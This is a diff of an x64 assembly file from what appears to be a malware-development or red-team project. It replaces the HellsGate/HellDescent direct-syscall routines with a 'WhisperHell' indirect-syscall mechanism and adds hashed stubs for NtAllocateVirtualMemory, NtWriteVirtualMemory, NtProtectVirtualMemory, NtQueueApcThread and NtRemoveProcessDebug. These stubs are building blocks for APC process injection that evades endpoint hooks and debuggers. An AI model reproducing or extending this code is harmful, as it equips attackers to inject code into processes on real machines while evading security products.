@@ -4,20 +4,7 @@
 .code
 	EXTERN SW3_GetRandomSyscallAddress: PROC
 
-	HellsGate PROC
-		mov wSystemCall, 000h
-		mov wSystemCall, ecx
-		ret
-	HellsGate ENDP
-
-	HellDescent PROC
-		mov r10, rcx
-		mov eax, wSystemCall
-		syscall
-		ret
-	HellDescent ENDP
-
-	;; New implementation of HellsGate with indirect syscalls: HellsDoor
+	;; New implementation of HellsGate with indirect syscalls: WhisperHell
 
 	WhisperHell PROC
 		mov wSystemCall, 000h
@@ -77,4 +64,33 @@
 	NtDelayExecution PROC
 		jmp GoToHell
 	NtDelayExecution ENDP
+
+	NtAllocateVirtualMemoryHashValue PROC
+		jmp GoToHell
+	NtAllocateVirtualMemoryHashValue ENDP
+	
+	NtProtectVirtualMemoryHashValue PROC
+		jmp GoToHell
+	NtProtectVirtualMemoryHashValue ENDP
+
+	NtWriteVirtualMemoryHashValue PROC
+		jmp GoToHell
+	NtWriteVirtualMemoryHashValue ENDP
+
+	NtQueueApcThreadHashValue PROC
+		jmp GoToHell
+	NtQueueApcThreadHashValue ENDP
+
+	NtQueryInformationProcessHashValue PROC
+		jmp GoToHell
+	NtQueryInformationProcessHashValue ENDP
+
+	NtRemoveProcessDebugHashValue PROC
+		jmp GoToHell	
+	NtRemoveProcessDebugHashValue ENDP
+
+	NtFreeVirtualMemoryHashValue PROC
+		jmp GoToHell
+	NtFreeVirtualMemoryHashValue ENDP
+
 end	
